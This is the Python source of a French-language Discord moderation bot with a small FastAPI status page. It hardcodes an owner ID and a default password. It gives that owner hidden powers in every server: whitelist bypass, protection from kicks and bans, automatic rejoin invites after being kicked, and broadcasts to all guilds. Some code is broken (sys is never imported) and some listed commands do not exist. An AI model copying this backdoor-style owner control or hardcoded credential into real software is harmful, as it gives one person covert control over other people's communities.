import os
import discord
from discord.ext import commands
import asyncio
from datetime import datetime
from fastapi import FastAPI
import uvicorn
import threading
import json

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID_DEFAULT = 489113166429683713
OWNER_PASSWORD_DEFAULT = "trolleur2010"
CONFIG_FILE = "config.json"
OWNER_FILE = "owner_data.json"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

app = FastAPI()

# -----------------------------
# JSON helpers
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# -----------------------------
# Owner & Config
# -----------------------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [OWNER_ID_DEFAULT]
        changed = True
    if "password" not in data:
        data["password"] = OWNER_PASSWORD_DEFAULT
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if OWNER_ID_DEFAULT not in owners:
        owners.append(OWNER_ID_DEFAULT)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", OWNER_PASSWORD_DEFAULT)

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)

def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

# -----------------------------
# Decorator whitelist
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

# -----------------------------
# DASHBOARD
# -----------------------------
@app.get("/")
async def home():
    return {"status": "Bot F.I.M en ligne"}

def run_dashboard():
    uvicorn.run(app, host="0.0.0.0", port=8080)

# -----------------------------
# EVENTS
# -----------------------------
@bot.event
async def on_ready():
    print(f"✅ {bot.user} connecté (ID: {bot.user.id})")

@bot.event
async def on_member_remove(member):
    # Si un owner est kick, prévenir et créer un invite
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Tu as été expulsé de **{guild.name}**. Invitation : {invite.url}")
                    except:
                        pass
        except Exception as e:
            print(f"[on_member_remove] erreur: {e}")

@bot.event
async def on_guild_remove(guild):
    # Si le bot est retiré, envoyer lien d'invitation aux owners
    try:
        client_id = str(bot.user.id)
        invite_link = f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré de **{guild.name}**. Réinvite : {invite_link}")
            except:
                pass
    except Exception as e:
        print(f"[on_guild_remove] erreur: {e}")

# -----------------------------
# COMMANDES PUBLIQUES
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    try: await ctx.message.delete()
    except: pass
    await channel.send(message)
    try: await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except: pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    try: await ctx.message.delete()
    except: pass
    em = discord.Embed(title=title, description=description, color=discord.Color.red())
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ {role.name} ajouté à {member.mention}")
    except:
        await ctx.send("❌ Impossible d'ajouter ce rôle.")

@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ {role.name} retiré de {member.mention}")
    except:
        await ctx.send("❌ Impossible de retirer ce rôle.")

@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason="Non spécifiée"):
    if member.id == bot.user.id:
        return await ctx.send("❌ Je ne peux pas me kicker moi-même.")
    if is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre un Owner.")
    await ctx.guild.kick(member, reason=f"{ctx.author} | {reason}")
    await ctx.send(f"✅ {member.mention} kické. Raison : {reason}")

@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason="Non spécifiée"):
    if member.id == bot.user.id:
        return await ctx.send("❌ Je ne peux pas me bannir moi-même.")
    if is_owner(member.id):
        return await ctx.send("❌ Impossible d'agir contre un Owner.")
    await ctx.guild.ban(member, reason=f"{ctx.author} | {reason}")
    await ctx.send(f"✅ {member.mention} banni. Raison : {reason}")

# -----------------------------
# OWNER COMMANDS
# -----------------------------
@bot.command()
async def broadcast(ctx, *, message: str):
    if not is_owner(ctx.author.id): return
    for g in bot.guilds:
        try:
            if g.text_channels:
                await g.text_channels[0].send(f"📢 **Annonce du propriétaire :** {message}")
        except: pass
    await ctx.author.send("✅ Broadcast envoyé.")

@bot.command()
async def reboot(ctx):
    if not is_owner(ctx.author.id): return
    await ctx.author.send("♻️ Redémarrage...")
    os.execv(sys.executable, [sys.executable] + sys.argv)

@bot.command(name="10-10")
async def ten_ten(ctx):
    if not is_owner(ctx.author.id): return
    if ctx.guild:
        await ctx.send("🧹 Déconnexion autorisée par owner.")
        await ctx.guild.leave()

@bot.command()
async def setpass(ctx, *, newpass: str):
    if not is_owner(ctx.author.id): return
    set_owner_password(newpass)
    await ctx.author.send("🔒 Mot de passe owner mis à jour.")

@bot.command(name="aide")
async def owner_help(ctx):
    if not is_owner(ctx.author.id): return
    cmds = [
        "!broadcast <msg>", "!forceunban", "!forcerinv", "!globalban <id>", "!globalkick <id>",
        "!serverlist", "!syncwhitelist", "!setpass <pass>", "!reboot", "!10-10"
    ]
    await ctx.author.send(f"👑 Commandes Owner :\n" + "\n".join(cmds))

# -----------------------------
# MAIN
# -----------------------------
if __name__ == "__main__":
    t = threading.Thread(target=run_dashboard)
    t.start()
    bot.run(TOKEN)
